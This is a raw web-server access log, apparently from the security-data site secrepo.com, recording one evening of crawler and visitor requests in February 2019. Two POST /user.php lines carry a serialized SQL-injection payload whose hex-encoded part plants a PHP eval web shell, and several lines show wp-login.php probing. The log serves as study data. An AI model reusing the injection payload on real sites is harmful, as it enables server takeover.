54.36.149.98 - - [16/Feb/2019:02:30:57 -0800] "GET /self.logs/error.log.2016-09-14.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.149.107 - - [16/Feb/2019:19:31:09 -0800] "GET /self.logs/2016/error.log.2016-11-30.gz HTTP/1.1" 200 881 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
157.55.39.131 - - [16/Feb/2019:19:41:37 -0800] "GET /self.logs/access.log.2019-01-23.gz HTTP/1.1" 200 21992 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
54.36.148.196 - - [16/Feb/2019:19:43:59 -0800] "GET /self.logs/error.log.2017-07-21.gz HTTP/1.1" 200 781 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
92.98.212.58 - - [16/Feb/2019:19:50:37 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36" 
92.98.212.58 - - [16/Feb/2019:19:50:38 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36" 
92.98.212.58 - - [16/Feb/2019:19:50:38 -0800] "GET /robots.txt HTTP/1.1" 200 334 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36" 
92.98.212.58 - - [16/Feb/2019:19:50:38 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36" 
92.98.212.58 - - [16/Feb/2019:19:50:39 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36" 
54.36.149.12 - - [16/Feb/2019:19:50:42 -0800] "GET /self.logs/error.log.2018-10-14.gz HTTP/1.1" 200 4610 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.148.143 - - [16/Feb/2019:19:51:20 -0800] "GET /self.logs/2015/access.log.2015-02-04.gz HTTP/1.1" 200 3928 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
103.106.148.203 - - [16/Feb/2019:19:52:19 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.0" 200 930799 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:62.0) Gecko/20100101 Firefox/62.0" 
54.36.149.85 - - [16/Feb/2019:19:52:48 -0800] "GET /self.logs/error.log.2018-07-07.gz HTTP/1.1" 200 4961 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
41.223.160.131 - - [16/Feb/2019:19:52:59 -0800] "GET /maccdc2012/dns.log.gz HTTP/1.1" 304 154 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
54.36.149.105 - - [16/Feb/2019:19:56:01 -0800] "GET /self.logs/error.log.2017-01-03.gz HTTP/1.1" 200 4260 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.149.77 - - [16/Feb/2019:19:56:41 -0800] "GET /self.logs/error.log.2019-01-21.gz HTTP/1.1" 200 4812 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.149.85 - - [16/Feb/2019:20:02:25 -0800] "GET /self.logs/2015/access.log.2015-03-04.gz HTTP/1.1" 200 3433 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
216.244.66.245 - - [16/Feb/2019:20:07:35 -0800] "GET /robots.txt HTTP/1.1" 301 462 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [16/Feb/2019:20:07:35 -0800] "GET /robots.txt HTTP/1.1" 200 233 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
54.36.148.225 - - [16/Feb/2019:20:08:12 -0800] "GET /self.logs/2016/error.log.2016-12-04.gz HTTP/1.1" 200 700 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
113.171.224.176 - - [16/Feb/2019:20:10:12 -0800] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
54.36.148.53 - - [16/Feb/2019:20:10:35 -0800] "GET /self.logs/error.log.2018-05-14.gz HTTP/1.1" 200 3979 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
216.244.66.245 - - [16/Feb/2019:20:13:42 -0800] "GET /tg/tg_snort_full.7z HTTP/1.1" 301 480 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
54.36.148.100 - - [16/Feb/2019:20:13:48 -0800] "GET /self.logs/error.log.2018-06-05.gz HTTP/1.1" 200 6222 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
209.15.209.89 - - [16/Feb/2019:20:16:34 -0800] "HEAD / HTTP/1.1" 200 239 "-" "-" 
75.65.53.61 - - [16/Feb/2019:20:16:34 -0800] "GET / HTTP/1.1" 200 12470 "https://www.researchgate.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36 OPR/58.0.3135.65" 
75.65.53.61 - - [16/Feb/2019:20:16:34 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36 OPR/58.0.3135.65" 
75.65.53.61 - - [16/Feb/2019:20:16:34 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36 OPR/58.0.3135.65" 
75.65.53.61 - - [16/Feb/2019:20:16:36 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36 OPR/58.0.3135.65" 
75.65.53.61 - - [16/Feb/2019:20:16:51 -0800] "GET /Datasets%20Description/Network/dhcp.html HTTP/1.1" 200 1355 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36 OPR/58.0.3135.65" 
75.65.53.61 - - [16/Feb/2019:20:16:51 -0800] "GET /favicon.ico HTTP/1.1" 200 267 "http://www.secrepo.com/Datasets%20Description/Network/dhcp.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36 OPR/58.0.3135.65" 
75.65.53.61 - - [16/Feb/2019:20:17:14 -0800] "GET /Datasets%20Description/Network/dns.html HTTP/1.1" 200 1437 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36 OPR/58.0.3135.65" 
75.65.53.61 - - [16/Feb/2019:20:17:32 -0800] "GET /Datasets%20Description/Network/weird.html HTTP/1.1" 200 1539 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36 OPR/58.0.3135.65" 
207.46.13.59 - - [16/Feb/2019:20:18:29 -0800] "GET /self.logs/error.log.2017-02-11.gz HTTP/1.1" 200 907 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
41.223.160.131 - - [16/Feb/2019:20:19:19 -0800] "GET /tg/tg_snort_fast.7z HTTP/1.1" 304 131 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
203.171.228.159 - - [16/Feb/2019:20:19:21 -0800] "POST /user.php HTTP/1.1" 404 295 "554fcae493e564ee0dc75bdf2ebf94caads|a:3:{s:2:\"id\";s:3:\"'/*\";s:3:\"num\";s:201:\"*/ union select 1,0x272F2A,3,4,5,6,7,8,0x7b247b24687a6c6c616761275d3b6576616c2f2a2a2f286261736536345f6465636f646528275a585a686243676b5831425055315262614870736247466e595630704f773d3d2729293b2f2f7d7d,0--\";s:4:\"name\";s:3:\"ads\";}554fcae493e564ee0dc75bdf2ebf94ca" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
203.171.228.159 - - [16/Feb/2019:20:19:22 -0800] "POST /user.php HTTP/1.1" 404 239 "45ea207d7a2b68c49582d2d22adf953aads|a:3:{s:3:\"num\";s:207:\"*/ select 1,0x2720756e696f6e2f2a,3,4,5,6,7,8,0x7b247b24487a6c6c616761275d3b6576616c2f2a2a2f286261736536345f6465636f646528275a585a686243676b5831425055315262534870736247466e595630704f773d3d2729293b2f2f7d7d,0--\";s:2:\"id\";s:9:\"' union/*\";s:4:\"name\";s:3:\"ads\";}45ea207d7a2b68c49582d2d22adf953a" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
52.70.48.63 - - [16/Feb/2019:20:20:42 -0800] "GET / HTTP/1.1" 301 427 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36" 
52.70.48.63 - - [16/Feb/2019:20:20:42 -0800] "GET / HTTP/1.1" 200 12414 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36" 
13.229.77.188 - - [16/Feb/2019:20:21:30 -0800] "GET / HTTP/1.1" 301 446 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36" 
13.229.77.188 - - [16/Feb/2019:20:21:31 -0800] "GET / HTTP/1.1" 200 12433 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36" 
54.36.149.71 - - [16/Feb/2019:20:23:25 -0800] "GET /self.logs/access.log.2016-05-10.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
66.249.66.84 - - [16/Feb/2019:20:23:43 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
13.229.77.188 - - [16/Feb/2019:20:23:57 -0800] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.50 Safari/537.36" 
13.229.77.188 - - [16/Feb/2019:20:23:58 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.50 Safari/537.36" 
66.249.66.84 - - [16/Feb/2019:20:24:17 -0800] "GET / HTTP/1.1" 304 189 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
54.36.148.245 - - [16/Feb/2019:20:26:32 -0800] "GET /self.logs/access.log.2015-10-29.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
157.55.39.131 - - [16/Feb/2019:20:28:27 -0800] "GET /self.logs/access.log.2017-01-24.gz HTTP/1.1" 200 17090 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
49.149.134.64 - - [16/Feb/2019:20:31:47 -0800] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
54.36.148.15 - - [16/Feb/2019:20:36:45 -0800] "GET /self.logs/access.log.2018-06-18.gz HTTP/1.1" 200 26483 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.148.176 - - [16/Feb/2019:20:40:33 -0800] "GET /self.logs/2015/access.log.2015-04-18.gz HTTP/1.1" 200 5670 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.148.160 - - [16/Feb/2019:20:48:28 -0800] "GET /self.logs/error.log.2015-12-16.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
42.156.137.94 - - [16/Feb/2019:20:50:37 -0800] "GET / HTTP/1.1" 200 12433 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) CriOS/56.0.2924.75 Mobile/14E5239e YisouSpider/5.0 Safari/602.1" 
216.244.66.245 - - [16/Feb/2019:20:53:06 -0800] "GET /robots.txt HTTP/1.1" 301 462 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [16/Feb/2019:20:53:07 -0800] "GET /robots.txt HTTP/1.1" 200 233 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
207.46.13.59 - - [16/Feb/2019:20:55:42 -0800] "GET /self.logs/access.log.2017-08-31.gz HTTP/1.1" 200 23644 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
54.36.148.128 - - [16/Feb/2019:20:57:38 -0800] "GET /self.logs/access.log.2018-10-11.gz HTTP/1.1" 200 37934 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
216.244.66.245 - - [16/Feb/2019:20:59:19 -0800] "GET /squid/access.log.gz HTTP/1.1" 301 480 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
54.36.149.37 - - [16/Feb/2019:21:06:01 -0800] "GET /self.logs/2016/access.log.2016-09-05.gz HTTP/1.1" 200 10098 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
113.171.224.176 - - [16/Feb/2019:21:13:58 -0800] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
207.46.13.59 - - [16/Feb/2019:21:21:13 -0800] "GET /self.logs/error.log.2018-12-23.gz HTTP/1.1" 304 188 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.131 - - [16/Feb/2019:21:22:00 -0800] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
54.36.149.27 - - [16/Feb/2019:21:24:16 -0800] "GET /self.logs/error.log.2016-12-10.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
157.55.39.131 - - [16/Feb/2019:21:24:16 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
54.36.148.46 - - [16/Feb/2019:21:26:54 -0800] "GET /self.logs/2016/access.log.2016-10-21.gz HTTP/1.1" 200 58524 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
148.251.36.84 - - [16/Feb/2019:21:30:43 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930836 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3393.4 Safari/537.36" 
162.242.144.71 - - [16/Feb/2019:21:32:38 -0800] "GET /robots.txt HTTP/1.1" 301 446 "-" "Tornado-Async-Client" 
162.242.144.71 - - [16/Feb/2019:21:32:38 -0800] "GET /robots.txt HTTP/1.1" 304 130 "-" "Tornado-Async-Client" 
162.242.144.71 - - [16/Feb/2019:21:32:38 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 301 484 "-" "Tornado-Async-Client" 
162.242.144.71 - - [16/Feb/2019:21:32:38 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930780 "-" "Tornado-Async-Client" 
216.244.66.245 - - [16/Feb/2019:21:34:39 -0800] "GET /squid/access.log.gz HTTP/1.1" 301 480 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
54.36.148.205 - - [16/Feb/2019:21:35:19 -0800] "GET /self.logs/error.log.2019-01-03.gz HTTP/1.1" 200 4343 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.148.215 - - [16/Feb/2019:21:36:57 -0800] "GET /self.logs/access.log.2015-07-26.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
115.239.212.134 - - [16/Feb/2019:21:40:40 -0800] "GET / HTTP/1.1" 200 12470 "http://www.baidu.com/s?wd=frontq71" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0" 
157.55.39.235 - - [16/Feb/2019:21:42:08 -0800] "GET /self.logs/access.log.2018-10-28.gz HTTP/1.1" 200 16123 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
148.64.56.79 - - [16/Feb/2019:21:47:04 -0800] "GET / HTTP/1.1" 200 12414 "-" "Mozilla/5.0 (compatible; GrapeshotCrawler/2.0; +http://www.grapeshot.co.uk/crawler.php)" 
54.36.149.12 - - [16/Feb/2019:21:48:46 -0800] "GET /self.logs/error.log.2018-04-02.gz HTTP/1.1" 200 3928 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
61.228.91.25 - - [16/Feb/2019:21:49:22 -0800] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
61.228.91.25 - - [16/Feb/2019:21:49:22 -0800] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
207.46.13.59 - - [16/Feb/2019:21:57:01 -0800] "GET /self.logs/error.log.2017-02-11.gz HTTP/1.1" 200 907 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.47 - - [16/Feb/2019:21:57:23 -0800] "GET /robots.txt HTTP/1.1" 301 502 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.47 - - [16/Feb/2019:21:57:23 -0800] "GET /robots.txt HTTP/1.1" 200 334 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
40.77.167.155 - - [16/Feb/2019:21:57:29 -0800] "GET /self.logs/error.log.2017-08-18.gz HTTP/1.1" 301 544 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
54.36.148.211 - - [16/Feb/2019:22:05:43 -0800] "GET /self.logs/2015/?C=M;O=D HTTP/1.1" 200 7610 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.148.135 - - [16/Feb/2019:22:06:06 -0800] "GET /self.logs/access.log.2015-12-28.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
40.77.167.155 - - [16/Feb/2019:22:08:14 -0800] "GET /Datasets%20Description/HTML_Bro_log_2/loaded_scripts.html HTTP/1.1" 200 1437 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
54.36.148.49 - - [16/Feb/2019:22:13:24 -0800] "GET /self.logs/error.log.2018-05-06.gz HTTP/1.1" 200 5094 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
216.244.66.245 - - [16/Feb/2019:22:13:57 -0800] "GET /robots.txt HTTP/1.1" 301 462 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
216.244.66.245 - - [16/Feb/2019:22:13:58 -0800] "GET /robots.txt HTTP/1.1" 200 233 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
180.76.13.11 - - [16/Feb/2019:22:15:26 -0800] "GET / HTTP/1.1" 200 46424 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.82 Safari/537.36" 
113.171.224.176 - - [16/Feb/2019:22:17:21 -0800] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
207.46.13.59 - - [16/Feb/2019:22:18:37 -0800] "GET /self.logs/error.log.2017-09-16.gz HTTP/1.1" 200 1770 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
54.36.148.90 - - [16/Feb/2019:22:19:03 -0800] "GET /self.logs/2015/access.log.2015-09-09.gz HTTP/1.1" 200 4655 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
216.244.66.245 - - [16/Feb/2019:22:20:01 -0800] "GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1" 301 532 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
199.58.86.211 - - [16/Feb/2019:22:23:00 -0800] "GET /robots.txt HTTP/1.1" 301 518 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
199.58.86.211 - - [16/Feb/2019:22:23:02 -0800] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
199.58.86.211 - - [16/Feb/2019:22:23:05 -0800] "GET / HTTP/1.1" 301 442 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
199.58.86.211 - - [16/Feb/2019:22:23:08 -0800] "GET / HTTP/1.1" 200 46368 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
199.58.86.211 - - [16/Feb/2019:22:23:12 -0800] "GET / HTTP/1.1" 200 12414 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
54.36.149.32 - - [16/Feb/2019:22:23:15 -0800] "GET /self.logs/error.log.2016-08-18.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
157.55.39.131 - - [16/Feb/2019:22:28:13 -0800] "GET /self.logs/error.log.2017-06-18.gz HTTP/1.1" 200 992 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.235 - - [16/Feb/2019:22:32:44 -0800] "GET /self.logs/access.log.2017-09-26.gz HTTP/1.1" 301 546 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
54.36.149.96 - - [16/Feb/2019:22:33:36 -0800] "GET /self.logs/access.log.2018-09-25.gz HTTP/1.1" 200 24595 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.148.167 - - [16/Feb/2019:22:34:03 -0800] "GET /self.logs/2015/access.log.2015-07-25.gz HTTP/1.1" 200 3510 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.149.97 - - [16/Feb/2019:22:47:30 -0800] "GET /self.logs/error.log.2018-10-23.gz HTTP/1.1" 200 4758 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
171.97.74.122 - - [16/Feb/2019:22:50:22 -0800] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
157.55.39.131 - - [16/Feb/2019:22:52:35 -0800] "GET /self.logs/access.log.2018-07-24.gz HTTP/1.1" 200 26145 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
41.223.160.131 - - [16/Feb/2019:22:53:00 -0800] "GET /maccdc2012/dns.log.gz HTTP/1.1" 304 154 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
124.82.49.186 - - [16/Feb/2019:22:57:03 -0800] "GET / HTTP/1.1" 200 12470 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36" 
124.82.49.186 - - [16/Feb/2019:22:57:05 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36" 
124.82.49.186 - - [16/Feb/2019:22:57:05 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36" 
124.82.49.186 - - [16/Feb/2019:22:57:12 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36" 
